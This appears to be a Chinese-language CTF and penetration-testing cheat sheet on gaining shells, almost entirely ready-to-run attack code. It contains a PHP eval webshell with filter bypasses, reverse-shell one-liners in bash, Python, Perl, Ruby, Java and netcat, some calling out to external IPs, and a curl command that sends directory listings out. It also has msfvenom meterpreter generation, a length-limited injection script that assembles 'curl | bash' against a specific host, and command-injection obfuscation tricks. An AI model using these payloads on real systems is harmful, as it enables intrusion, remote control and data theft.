# Shell

## 几种特殊符号

1. 反引号 `` ` ``
2. 文件重定向符 `` > <``
3. 环境变量 ``${}``

## 关于反弹shell

通常用于被控端因防火墙受限、权限不足、端口被占用等情形

假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？

1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2.它的ip会动态改变，你不能持续控制。

3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。

攻击者指定服务端，受害者主机主动连接攻击者的服务端程序

## PHP

一句话：

```php
<?php eval($_REQUEST['eki']);?>
```

``eval``也可以改成``system、assert``

### Bypass:

1. 当仅禁用``<?php``时，可以使用``<?    ?> ``
    
   要求：需要开启短标签开关，``short_open_tag``

2. 当禁用``<?php``以及``?>``时，还可以使用``<?=``不需要闭合标签 
    
    要求：PHP版本>PHP 5.4.0

3. 禁用了``<?、 <?php、 ?>``时，可以使用asp标签``<%  %>``

    要求：asp_tags设成On


4. ``<script language="php">system($_REQUEST['eki']);</script>`` 
   
    等价于``<?php system($_REQUEST['eki']);?>``

    要求：php7之前

命令行反弹Shell

```bash
php -r '$sock=fsockopen("127.0.0.1",2333);exec("/bin/sh -i <&3 >&3 2>&3");
```

curl
```bash
curl http://127.0.0.1:2333/ -d `ls /`;
```

## BASH

```bash
bash -i >& /dev/tcp/127.0.0.1/233 0>&1
```

Ex: (自动根据环境来反弹shell)

```
if command -v python > /dev/null 2>&1; then python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("174.1.69.127",2333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' exit; fi if command -v perl > /dev/null 2>&1; then perl -e 'use Socket;$i="174.1.69.127";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' exit; fi if command -v nc > /dev/null 2>&1; then rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 174.1.69.127 2333 >/tmp/f exit; fi if command -v sh > /dev/null 2>&1; then /bin/sh -i >& /dev/tcp/174.1.69.127/2333 0>&1 exit; fi
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Perl

```perl
perl -e 'use Socket;$i="127.0.0.1";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",233).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java

java的shell需要一些奇怪的姿势

``/bin/sh -c '$@|sh' xxx  echo ls`` -> `ls`



```java
Runtime.getRuntime().exec("bash -c {echo,<base64 payload>}|{base64,-d}|{bash,-i}");
Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xx.xx.xx.xx/9999 0>&1");
Runtime.getRuntime().exec("/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/xx.xx.xx.xx/8888<&1");
```



## Netcat

```bash
nc -e /bin/sh 127.0.0.1 2333
```

正向弹

靶机：
```bash
nc -lvvp 2333 -e /bin/bash
```

攻击机
```
nc ip 2333
```

## msf 马

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost={IP} lport={PORT} -f elf -o shell
```

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.187.130
set lport 4444

exploit
```

## 获取Bash交互行

```
python -c "import pty;pty.spawn('/bin/bash')"
```

## 字符限制绕过

以hackme为例

```python
import requests
from time import sleep
from urllib import quote
import base64

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate "curl <IPHEX> | ba sh;"
    # 
    '>\;',  
    '>sh\\',
    '>ba\\', 
    '>\|\\',
    '>XX\\', 
    '>XX\\', 
    '>XX\\', 
    '>XX\\',
    '>0x\\',
    '>\ \\', 
    '>rl\\',
    '>cu\\',

    'sh x', 
    'sh g',
]


for i in payload:
    assert len(i) <= 4
    header ={
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Cookie":"PHPSESSID=1af6e5b03d0df7c07ae2e548bd44183c"
    }
    data ={
        "url":"compress.zlib://data:@127.0.0.1/plain;base64,"+base64.b64encode(i)
    }
    r = requests.post(url='http://121.36.222.22:88/core/index.php',data=data,headers=header)
    print r.text
    print i
    sleep(0.1)
```

## 绕过cat

1. ``\``
2. ``rev,more,head,more``
3. ``tac``

## 绕过``/readflag``


>可以使用 bash 时
>
>**Trap the SIGALRM signal**
>$ trap "" 14 && /readflag 
>Solve the easy challenge first (((((-623343)+(913340))+(-511878))+(791102))-(956792)) 
>input your answer: -387571 
>ok! here is your flag!! 
>...
>
>**mkfifo trick**
>$ mkfifo pipe
>$ cat pipe | /readflag |(read l;read l;echo "$(($l))\n" > pipe;cat) <dflag ((read 1;read l;echo .4(($1))\n. > pipe;cat) 
>input your answer: 
>ok! here is your flag!! 
>...
>
>```
>rm /tmp/pipe; mkfifo /tmp/pipe ; cat /tmp/pipe | /readflag |(read l;read l;echo "$(($l))" > /tmp/pipe;cat)
>```

https://github.com/ZeddYu/ReadFlag/blob/master/bash.md

trap命令 https://man.linuxde.net/trap

mkfifo /tmp/f is creating a named pipe at /tmp/f.

cat /tmp/f is printing whatever is written to that named pipe and the output of cat /tmp/f is been piped to /readflag

## 一些绕过技巧

```bash
a=dex.php;b=in;d=bas;e=e64;c=$d$e$IFS$b$a;$c;
```
bash变量字符拼接

### 参考资料

命令注入绕过姿势

https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/

rce bypass

http://www.leommxj.com/2017/06/11/RCE-Bypass/